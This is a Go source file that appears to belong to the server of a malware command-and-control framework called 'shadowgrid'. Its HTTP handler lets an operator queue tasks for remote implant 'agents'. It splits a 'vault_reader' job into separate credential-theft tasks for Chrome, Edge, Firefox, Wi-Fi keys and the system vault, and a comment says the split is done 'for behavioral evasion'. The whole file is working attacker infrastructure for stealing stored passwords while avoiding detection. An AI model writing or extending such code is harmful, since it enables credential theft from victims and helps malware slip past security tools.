package api

import (
	"encoding/json"
	"net/http"

	"github.com/go-chi/chi/v5"

	"shadowgrid/models"
)

type createTaskRequest struct {
	TaskType string          `json:"task_type"`
	Args     json.RawMessage `json:"args"`
}

func (s *Server) handleCreateTask(w http.ResponseWriter, r *http.Request) {
	agentID := chi.URLParam(r, "id")
	var req createTaskRequest
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
		jsonError(w, "Invalid request", http.StatusBadRequest)
		return
	}

	argsJSON := "{}"
	if req.Args != nil {
		argsJSON = string(req.Args)
	}

	operator := r.Context().Value(operatorKey).(string)

	// Auto-split vault_reader into per-source tasks for behavioral evasion
	if req.TaskType == "vault_reader" {
		var parsedArgs map[string]interface{}
		if req.Args != nil {
			_ = json.Unmarshal(req.Args, &parsedArgs)
		}
		if parsedArgs == nil {
			parsedArgs = map[string]interface{}{}
		}
		source, _ := parsedArgs["source"].(string)
		if source == "" || source == "all" {
			sources := []string{"chrome", "edge", "firefox", "wifi", "vault"}
			var firstID int64
			for i, src := range sources {
				splitArgs, _ := json.Marshal(map[string]string{"source": src})
				splitTask := &models.Task{
					AgentID:   agentID,
					TaskType:  "vault_reader",
					ArgsJSON:  string(splitArgs),
					CreatedBy: operator,
				}
				id, err := s.DB.CreateTask(splitTask)
				if err != nil {
					jsonError(w, err.Error(), http.StatusInternalServerError)
					return
				}
				if i == 0 {
					firstID = id
				}
			}
			s.DB.LogActivity("task", operator+" created vault_reader (5 split tasks) for agent "+agentID)
			jsonResponse(w, map[string]interface{}{"id": firstID, "status": "created", "split": 5})
			return
		}
	}

	task := &models.Task{
		AgentID:   agentID,
		TaskType:  req.TaskType,
		ArgsJSON:  argsJSON,
		CreatedBy: operator,
	}

	id, err := s.DB.CreateTask(task)
	if err != nil {
		jsonError(w, err.Error(), http.StatusInternalServerError)
		return
	}

	s.DB.LogActivity("task", operator+" created task "+req.TaskType+" for agent "+agentID)
	jsonResponse(w, map[string]interface{}{"id": id, "status": "created"})
}
